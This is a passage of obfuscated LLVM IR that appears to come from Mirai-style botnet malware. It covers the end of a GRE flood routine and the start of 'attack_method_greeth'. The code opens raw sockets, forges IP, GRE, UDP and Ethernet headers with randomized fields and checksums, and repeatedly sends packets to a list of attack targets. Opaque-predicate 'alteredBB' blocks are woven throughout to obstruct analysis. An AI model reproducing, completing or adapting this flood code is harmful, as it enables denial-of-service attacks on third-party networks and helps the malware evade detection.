  %379 = load %struct.grehdr*, %struct.grehdr** %28, align 8
  %380 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %379, i64 1
  %381 = bitcast %struct.grehdr* %380 to %struct.iphdr*
  store %struct.iphdr* %381, %struct.iphdr** %29, align 8
  %382 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %383 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %382, i64 1
  %384 = bitcast %struct.iphdr* %383 to %struct.udphdr*
  store %struct.udphdr* %384, %struct.udphdr** %30, align 8
  %385 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %386 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %385, i64 1
  %387 = bitcast %struct.udphdr* %386 to i8*
  store i8* %387, i8** %31, align 8
  %388 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %389 = load i32, i32* %9, align 4
  %390 = sext i32 %389 to i64
  %391 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %388, i64 %390
  %392 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %391, i32 0, i32 2
  %393 = load i8, i8* %392, align 4
  %394 = zext i8 %393 to i32
  %395 = icmp slt i32 %394, 32
  %396 = load i32, i32* @x.19
  %397 = load i32, i32* @y.20
  %398 = sub i32 %396, 1
  %399 = mul i32 %396, %398
  %400 = urem i32 %399, 2
  %401 = icmp eq i32 %400, 0
  %402 = icmp slt i32 %397, 10
  %403 = or i1 %401, %402
  br i1 %403, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %395, label %404, label %425

; <label>:404:                                    ; preds = %originalBBpart264
  %405 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %406 = load i32, i32* %9, align 4
  %407 = sext i32 %406 to i64
  %408 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %405, i64 %407
  %409 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %408, i32 0, i32 1
  %410 = load i32, i32* %409, align 4
  %411 = call i32 @ntohl(i32 %410) #7
  %412 = call i32 @rand_next()
  %413 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %414 = load i32, i32* %9, align 4
  %415 = sext i32 %414 to i64
  %416 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %413, i64 %415
  %417 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %416, i32 0, i32 2
  %418 = load i8, i8* %417, align 4
  %419 = zext i8 %418 to i32
  %420 = lshr i32 %412, %419
  %421 = add i32 %411, %420
  %422 = call i32 @htonl(i32 %421) #7
  %423 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %424 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %423, i32 0, i32 9
  store i32 %422, i32* %424, align 4
  br label %425

; <label>:425:                                    ; preds = %404, %originalBBpart264
  %426 = load i32, i32* %21, align 4
  %427 = icmp eq i32 %426, -1
  br i1 %427, label %428, label %432

; <label>:428:                                    ; preds = %425
  %429 = call i32 @rand_next()
  %430 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %431 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %430, i32 0, i32 8
  store i32 %429, i32* %431, align 4
  br label %432

; <label>:432:                                    ; preds = %428, %425
  %433 = load i32, i32* @x.19
  %434 = load i32, i32* @y.20
  %435 = sub i32 %433, 1
  %436 = mul i32 %433, %435
  %437 = urem i32 %436, 2
  %438 = icmp eq i32 %437, 0
  %439 = icmp slt i32 %434, 10
  %440 = or i1 %438, %439
  br i1 %440, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %432
  %441 = load i16, i16* %13, align 2
  %442 = zext i16 %441 to i32
  %443 = icmp eq i32 %442, 65535
  %444 = load i32, i32* @x.19
  %445 = load i32, i32* @y.20
  %446 = sub i32 %444, 1
  %447 = mul i32 %444, %446
  %448 = urem i32 %447, 2
  %449 = icmp eq i32 %448, 0
  %450 = icmp slt i32 %445, 10
  %451 = or i1 %449, %450
  br i1 %451, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %443, label %452, label %467

; <label>:452:                                    ; preds = %originalBBpart268
  %453 = call i32 @rand_next()
  %454 = and i32 %453, 65535
  %455 = trunc i32 %454 to i16
  %456 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %457 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %456, i32 0, i32 3
  store i16 %455, i16* %457, align 4
  %458 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %459 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %458, i32 0, i32 3
  %460 = load i16, i16* %459, align 4
  %461 = zext i16 %460 to i32
  %462 = sub nsw i32 %461, 1000
  %463 = xor i32 %462, -1
  %464 = trunc i32 %463 to i16
  %465 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %466 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %465, i32 0, i32 3
  store i16 %464, i16* %466, align 4
  br label %467

; <label>:467:                                    ; preds = %452, %originalBBpart268
  %468 = load i16, i16* %16, align 2
  %469 = zext i16 %468 to i32
  %470 = icmp eq i32 %469, 65535
  br i1 %470, label %471, label %477

; <label>:471:                                    ; preds = %467
  %472 = call i32 @rand_next()
  %473 = and i32 %472, 65535
  %474 = trunc i32 %473 to i16
  %475 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %476 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %475, i32 0, i32 0
  store i16 %474, i16* %476, align 2
  br label %477

; <label>:477:                                    ; preds = %471, %467
  %478 = load i16, i16* %17, align 2
  %479 = zext i16 %478 to i32
  %480 = icmp eq i32 %479, 65535
  br i1 %480, label %481, label %487

; <label>:481:                                    ; preds = %477
  %482 = call i32 @rand_next()
  %483 = and i32 %482, 65535
  %484 = trunc i32 %483 to i16
  %485 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %486 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %485, i32 0, i32 1
  store i16 %484, i16* %486, align 2
  br label %487

; <label>:487:                                    ; preds = %481, %477
  %488 = load i32, i32* @x.19
  %489 = load i32, i32* @y.20
  %490 = sub i32 %488, 1
  %491 = mul i32 %488, %490
  %492 = urem i32 %491, 2
  %493 = icmp eq i32 %492, 0
  %494 = icmp slt i32 %489, 10
  %495 = or i1 %493, %494
  br i1 %495, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %487
  %496 = load i8, i8* %20, align 1
  %497 = icmp ne i8 %496, 0
  %498 = load i32, i32* @x.19
  %499 = load i32, i32* @y.20
  %500 = sub i32 %498, 1
  %501 = mul i32 %498, %500
  %502 = urem i32 %501, 2
  %503 = icmp eq i32 %502, 0
  %504 = icmp slt i32 %499, 10
  %505 = or i1 %503, %504
  br i1 %505, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br i1 %497, label %510, label %506

; <label>:506:                                    ; preds = %originalBBpart272
  %507 = call i32 @rand_next()
  %508 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %509 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %508, i32 0, i32 9
  store i32 %507, i32* %509, align 4
  br label %532

; <label>:510:                                    ; preds = %originalBBpart272
  %511 = load i32, i32* @x.19
  %512 = load i32, i32* @y.20
  %513 = sub i32 %511, 1
  %514 = mul i32 %511, %513
  %515 = urem i32 %514, 2
  %516 = icmp eq i32 %515, 0
  %517 = icmp slt i32 %512, 10
  %518 = or i1 %516, %517
  br i1 %518, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %510
  %519 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %520 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %519, i32 0, i32 9
  %521 = load i32, i32* %520, align 4
  %522 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %523 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %522, i32 0, i32 9
  store i32 %521, i32* %523, align 4
  %524 = load i32, i32* @x.19
  %525 = load i32, i32* @y.20
  %526 = sub i32 %524, 1
  %527 = mul i32 %524, %526
  %528 = urem i32 %527, 2
  %529 = icmp eq i32 %528, 0
  %530 = icmp slt i32 %525, 10
  %531 = or i1 %529, %530
  br i1 %531, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br label %532

; <label>:532:                                    ; preds = %originalBBpart276, %506
  %533 = load i8, i8* %19, align 1
  %534 = icmp ne i8 %533, 0
  br i1 %534, label %535, label %538

; <label>:535:                                    ; preds = %532
  %536 = load i8*, i8** %31, align 8
  %537 = load i32, i32* %18, align 4
  call void @rand_str(i8* %536, i32 %537)
  br label %538

; <label>:538:                                    ; preds = %535, %532
  %539 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %540 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %539, i32 0, i32 7
  store i16 0, i16* %540, align 2
  %541 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %542 = bitcast %struct.iphdr* %541 to i16*
  %543 = call zeroext i16 @checksum_generic(i16* %542, i32 20)
  %544 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %545 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %544, i32 0, i32 7
  store i16 %543, i16* %545, align 2
  %546 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %547 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %546, i32 0, i32 7
  store i16 0, i16* %547, align 2
  %548 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %549 = bitcast %struct.iphdr* %548 to i16*
  %550 = call zeroext i16 @checksum_generic(i16* %549, i32 20)
  %551 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %552 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %551, i32 0, i32 7
  store i16 %550, i16* %552, align 2
  %553 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %554 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %553, i32 0, i32 3
  store i16 0, i16* %554, align 2
  %555 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %556 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %557 = bitcast %struct.udphdr* %556 to i8*
  %558 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %559 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %558, i32 0, i32 2
  %560 = load i16, i16* %559, align 2
  %561 = load i32, i32* %18, align 4
  %562 = sext i32 %561 to i64
  %563 = add i64 8, %562
  %564 = trunc i64 %563 to i32
  %565 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %555, i8* %557, i16 zeroext %560, i32 %564)
  %566 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %567 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %566, i32 0, i32 3
  store i16 %565, i16* %567, align 2
  %568 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %569 = load i32, i32* %9, align 4
  %570 = sext i32 %569 to i64
  %571 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %568, i64 %570
  %572 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %571, i32 0, i32 0
  %573 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %572, i32 0, i32 0
  store i16 2, i16* %573, align 4
  %574 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %575 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %574, i32 0, i32 9
  %576 = load i32, i32* %575, align 4
  %577 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %578 = load i32, i32* %9, align 4
  %579 = sext i32 %578 to i64
  %580 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %577, i64 %579
  %581 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %580, i32 0, i32 0
  %582 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %581, i32 0, i32 2
  %583 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %582, i32 0, i32 0
  store i32 %576, i32* %583, align 4
  %584 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %585 = load i32, i32* %9, align 4
  %586 = sext i32 %585 to i64
  %587 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %584, i64 %586
  %588 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %587, i32 0, i32 0
  %589 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %588, i32 0, i32 1
  store i16 0, i16* %589, align 2
  %590 = load i32, i32* %10, align 4
  %591 = load i8*, i8** %26, align 8
  %592 = load i32, i32* %18, align 4
  %593 = sext i32 %592 to i64
  %594 = add i64 52, %593
  %595 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %596 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %597 = load i32, i32* %9, align 4
  %598 = sext i32 %597 to i64
  %599 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %596, i64 %598
  %600 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %599, i32 0, i32 0
  %601 = bitcast %struct.sockaddr_in* %600 to %struct.sockaddr*
  store %struct.sockaddr* %601, %struct.sockaddr** %595, align 8
  %602 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %603 = load %struct.sockaddr*, %struct.sockaddr** %602, align 8
  %604 = call i64 @sendto(i32 %590, i8* %591, i64 %594, i32 16384, %struct.sockaddr* %603, i32 16)
  br label %605

; <label>:605:                                    ; preds = %538
  %606 = load i32, i32* %9, align 4
  %607 = add nsw i32 %606, 1
  store i32 %607, i32* %9, align 4
  br label %355

; <label>:608:                                    ; preds = %355
  br label %354

; <label>:609:                                    ; preds = %originalBBpart28, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %78
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %95
  store i32 1, i32* %9, align 4
  %610 = load i32, i32* %10, align 4
  %611 = bitcast i32* %9 to i8*
  %612 = call i32 @setsockopt(i32 %610, i32 0, i32 3, i8* %611, i32 4) #6
  %613 = icmp eq i32 %612, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %116
  %614 = load i32, i32* %10, align 4
  %615 = call i32 @close(i32 %614)
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %136
  %616 = load i32, i32* %9, align 4
  %617 = load i8, i8* %5, align 1
  %618 = zext i8 %617 to i32
  %619 = icmp slt i32 %616, %618
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %211
  %620 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %621 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %620, i32 0, i32 6
  store i8 47, i8* %621, align 1
  %622 = load i32, i32* %21, align 4
  %623 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %624 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %623, i32 0, i32 8
  store i32 %622, i32* %624, align 4
  %625 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %626 = load i32, i32* %9, align 4
  %627 = sext i32 %626 to i64
  %628 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %625, i64 %627
  %629 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %628, i32 0, i32 1
  %630 = load i32, i32* %629, align 4
  %631 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %632 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %631, i32 0, i32 9
  store i32 %630, i32* %632, align 4
  %633 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %634 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %635 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %634, i32 0, i32 1
  store i16 %633, i16* %635, align 2
  %636 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %637 = bitcast %struct.iphdr* %636 to i8*
  %638 = load i8, i8* %637, align 4
  %_ = shl i8 %638, 15
  %_15 = shl i8 %638, 15
  %639 = and i8 %638, 15
  %_16 = shl i8 %639, 64
  %_17 = sub i8 %639, 64
  %gen = mul i8 %_17, 64
  %640 = or i8 %639, 64
  store i8 %640, i8* %637, align 4
  %641 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %642 = bitcast %struct.iphdr* %641 to i8*
  %643 = load i8, i8* %642, align 4
  %_18 = shl i8 %643, -16
  %644 = and i8 %643, -16
  %_19 = shl i8 %644, 5
  %_20 = sub i8 0, %644
  %gen21 = add i8 %_20, 5
  %_22 = sub i8 0, %644
  %gen23 = add i8 %_22, 5
  %_24 = sub i8 0, %644
  %gen25 = add i8 %_24, 5
  %_26 = sub i8 %644, 5
  %gen27 = mul i8 %_26, 5
  %_28 = sub i8 %644, 5
  %gen29 = mul i8 %_28, 5
  %645 = or i8 %644, 5
  store i8 %645, i8* %642, align 4
  %646 = load i8, i8* %12, align 1
  %647 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %648 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %647, i32 0, i32 1
  store i8 %646, i8* %648, align 1
  %649 = load i32, i32* %18, align 4
  %650 = sext i32 %649 to i64
  %_30 = sub i64 0, 28
  %gen31 = add i64 %_30, %650
  %_32 = shl i64 28, %650
  %_33 = sub i64 0, 28
  %gen34 = add i64 %_33, %650
  %_35 = shl i64 28, %650
  %651 = add i64 28, %650
  %652 = trunc i64 %651 to i16
  %653 = call zeroext i16 @htons(i16 zeroext %652) #7
  %654 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %655 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %654, i32 0, i32 2
  store i16 %653, i16* %655, align 2
  %656 = load i16, i16* %13, align 2
  %657 = zext i16 %656 to i32
  %_36 = sub i32 %657, -1
  %gen37 = mul i32 %_36, -1
  %_38 = shl i32 %657, -1
  %_39 = shl i32 %657, -1
  %658 = xor i32 %657, -1
  %659 = trunc i32 %658 to i16
  %660 = call zeroext i16 @htons(i16 zeroext %659) #7
  %661 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %662 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %661, i32 0, i32 3
  store i16 %660, i16* %662, align 4
  %663 = load i8, i8* %14, align 1
  %664 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %665 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %664, i32 0, i32 5
  store i8 %663, i8* %665, align 4
  %666 = load i8, i8* %15, align 1
  %667 = icmp ne i8 %666, 0
  br label %originalBB14

originalBB43alteredBB:                            ; preds = %originalBB43, %276
  %668 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %669 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %670 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %669, i32 0, i32 4
  store i16 %668, i16* %670, align 2
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %334
  %671 = load i32, i32* %9, align 4
  %_48 = sub i32 0, %671
  %gen49 = add i32 %_48, 1
  %_50 = shl i32 %671, 1
  %_51 = sub i32 0, %671
  %gen52 = add i32 %_51, 1
  %_53 = sub i32 0, %671
  %gen54 = add i32 %_53, 1
  %_55 = sub i32 %671, 1
  %gen56 = mul i32 %_55, 1
  %_57 = sub i32 0, %671
  %gen58 = add i32 %_57, 1
  %672 = add nsw i32 %671, 1
  store i32 %672, i32* %9, align 4
  br label %originalBB47

originalBB62alteredBB:                            ; preds = %originalBB62, %360
  %673 = load i8**, i8*** %11, align 8
  %674 = load i32, i32* %9, align 4
  %675 = sext i32 %674 to i64
  %676 = getelementptr inbounds i8*, i8** %673, i64 %675
  %677 = load i8*, i8** %676, align 8
  store i8* %677, i8** %26, align 8
  %678 = load i8*, i8** %26, align 8
  %679 = bitcast i8* %678 to %struct.iphdr*
  store %struct.iphdr* %679, %struct.iphdr** %27, align 8
  %680 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %681 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %680, i64 1
  %682 = bitcast %struct.iphdr* %681 to %struct.grehdr*
  store %struct.grehdr* %682, %struct.grehdr** %28, align 8
  %683 = load %struct.grehdr*, %struct.grehdr** %28, align 8
  %684 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %683, i64 1
  %685 = bitcast %struct.grehdr* %684 to %struct.iphdr*
  store %struct.iphdr* %685, %struct.iphdr** %29, align 8
  %686 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %687 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %686, i64 1
  %688 = bitcast %struct.iphdr* %687 to %struct.udphdr*
  store %struct.udphdr* %688, %struct.udphdr** %30, align 8
  %689 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %690 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %689, i64 1
  %691 = bitcast %struct.udphdr* %690 to i8*
  store i8* %691, i8** %31, align 8
  %692 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %693 = load i32, i32* %9, align 4
  %694 = sext i32 %693 to i64
  %695 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %692, i64 %694
  %696 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %695, i32 0, i32 2
  %697 = load i8, i8* %696, align 4
  %698 = zext i8 %697 to i32
  %699 = icmp slt i32 %698, 32
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %432
  %700 = load i16, i16* %13, align 2
  %701 = zext i16 %700 to i32
  %702 = icmp eq i32 %701, 65535
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %487
  %703 = load i8, i8* %20, align 1
  %704 = icmp ne i8 %703, 0
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %510
  %705 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %706 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %705, i32 0, i32 9
  %707 = load i32, i32* %706, align 4
  %708 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %709 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %708, i32 0, i32 9
  store i32 %707, i32* %709, align 4
  br label %originalBB74
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare i32 @close(i32) #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greeth(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.21
  %6 = load i32, i32* @y.22
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8**, align 8
  %20 = alloca i8, align 1
  %21 = alloca i16, align 2
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i16, align 2
  %25 = alloca i16, align 2
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i8, align 1
  %29 = alloca i32, align 4
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca %struct.ethhdr*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.udphdr*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i8*, align 8
  %39 = alloca %struct.iphdr*, align 8
  %40 = alloca %struct.grehdr*, align 8
  %41 = alloca %struct.ethhdr*, align 8
  %42 = alloca %struct.iphdr*, align 8
  %43 = alloca %struct.udphdr*, align 8
  %44 = alloca i8*, align 8
  %45 = alloca i32, align 4
  %46 = alloca i32, align 4
  %47 = alloca i32, align 4
  %48 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  %49 = load i8, i8* %13, align 1
  %50 = zext i8 %49 to i64
  %51 = call noalias i8* @calloc(i64 %50, i64 8) #6
  %52 = bitcast i8* %51 to i8**
  store i8** %52, i8*** %19, align 8
  %53 = load i8, i8* %15, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 2, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %20, align 1
  %57 = load i8, i8* %15, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 3, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %21, align 2
  %61 = load i8, i8* %15, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 4, i32 64)
  %64 = trunc i32 %63 to i8
  store i8 %64, i8* %22, align 1
  %65 = load i8, i8* %15, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 5, i32 1)
  %68 = trunc i32 %67 to i8
  store i8 %68, i8* %23, align 1
  %69 = load i8, i8* %15, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 6, i32 65535)
  %72 = trunc i32 %71 to i16
  store i16 %72, i16* %24, align 2
  %73 = load i8, i8* %15, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %75 = call i32 @attack_get_opt_int(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 7, i32 65535)
  %76 = trunc i32 %75 to i16
  store i16 %76, i16* %25, align 2
  %77 = load i8, i8* %15, align 1
  %78 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %79 = call i32 @attack_get_opt_int(i8 zeroext %77, %struct.attack_option* %78, i8 zeroext 0, i32 512)
  store i32 %79, i32* %26, align 4
  %80 = load i8, i8* %15, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 1, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %27, align 1
  %84 = load i8, i8* %15, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 19, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %28, align 1
  %88 = load i8, i8* %15, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %90 = load i32, i32* @LOCAL_ADDR, align 4
  %91 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 25, i32 %90)
  store i32 %91, i32* %29, align 4
  %92 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %92, i32* %18, align 4
  %93 = icmp eq i32 %92, -1
  %94 = load i32, i32* @x.21
  %95 = load i32, i32* @y.22
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %93, label %102, label %103

; <label>:102:                                    ; preds = %originalBBpart2
  br label %696

; <label>:103:                                    ; preds = %originalBBpart2
  %104 = load i32, i32* @x.21
  %105 = load i32, i32* @y.22
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %103
  store i32 1, i32* %17, align 4
  %112 = load i32, i32* %18, align 4
  %113 = bitcast i32* %17 to i8*
  %114 = call i32 @setsockopt(i32 %112, i32 0, i32 3, i8* %113, i32 4) #6
  %115 = icmp eq i32 %114, -1
  %116 = load i32, i32* @x.21
  %117 = load i32, i32* @y.22
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %115, label %124, label %127

; <label>:124:                                    ; preds = %originalBBpart24
  %125 = load i32, i32* %18, align 4
  %126 = call i32 @close(i32 %125)
  br label %696

; <label>:127:                                    ; preds = %originalBBpart24
  %128 = load i32, i32* @x.21
  %129 = load i32, i32* @y.22
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
